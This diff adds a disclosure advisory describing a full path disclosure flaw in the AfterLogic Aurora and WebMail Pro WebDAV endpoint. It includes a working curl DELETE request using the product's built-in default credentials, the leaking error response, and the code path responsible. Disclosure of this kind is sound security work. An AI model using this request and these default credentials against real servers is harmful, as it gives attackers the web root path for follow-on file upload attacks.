@@ -1,0 +1,59 @@
+# **Report Title:** Public Full Path Disclosure on AfterLogic Aurora & WebMail Pro WebDAV EndPoint
+
+**The severity of the issue:** Medium
+
+**Complexity:** Easy
+
+**Affected Products:** AfterLogic Aurora, AfterLogic WebMail PRO
+
+**Authentication:** Not required
+
+**Attacks:** Full Path Disclosure
+
+## **Resources :**
+
+* https://owasp.org/www-community/attacks/Full_Path_Disclosure
+* https://owasp.org/www-community/attacks/Path_Traversal
+
+## **Authors :**
+
+* Emre KELEŞ - @emrekeles on twitter
+* Emircan YILDIZ - @scorpsec on twitter
+* Halil Emre ÖZEN - @halilemreozen on twitter
+
+## **Report Summary :**
+AfterLogic Aurora and WebMail Pro products with 7.7.9 and all lower versions are affected by this vulnerability, simply sending an HTTP DELETE request to WebDAV EndPoint with built-in “**caldav_public_user@localhost**” and it’s the predefined password “**caldav_public_user**” allows the attacker to obtain web root path.
+
+## **To Reproduce :**
+
+Get the web root path with the following curl command
+
+```shell
+curl -X DELETE -u 'caldav_public_user@localhost:caldav_public_user' "https://sample-mail.tld/dav/server.php/files/personal/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021"
+```
+
+## **Response :**
+
+``` xml
+<?xml version="1.0" encoding="utf-8"?>
+<d:error xmlns:d="DAV:" xmlns:s="http://sabredav.org/ns">
+  <s:exception>Sabre\DAV\Exception\NotFound</s:exception>
+  <s:message>File with name /var/www/html/www/webmailpro.dev/data/files/private/caldav_public_user@localhost/GIVE_ME_ERROR_TO_GET_DOC_ROOT_2021 could not be located</s:message>
+</d:error>
+```
+
+In this scenario : **/var/www/html/www/webmailpro.dev** is the web root path, this data is especially becomes valuable for the file upload vulnerabilities.
+
+## **Technical Description:**
+
+* dav\server.php (handles the request, create the \afterlogic\DAV\Server instance )
+* \libraries\Sabre\DAV\server.php -> exec (Pass the request method and uri to invokeMethod)
+* \libraries\Sabre\DAV\server.php -> invokeMethod 
+* \libraries\Sabre\DAV\server.php -> httpDelete
+* \libraries\Sabre\DAV\Tree.php -> delete
+* \libraries\Sabre\DAV\ObjectTree.php -> getNodeForPath
+* \libraries\Sabre\DAV\FS\Directory.php -> getChild
+
+Get web root path vulnerability starts on step 7 / getChild, at the \Sabre\DAV\Exception\NotFound('File with name ' . $path . ' could not be located') line **$path** variable contains web root path
+
+With the above problem any loggable user can obtain web root path, with the caldav_public_user@localhost user, attackers don’t need any user info because it has a predefined password, so vulnerability becomes publicly accessible.
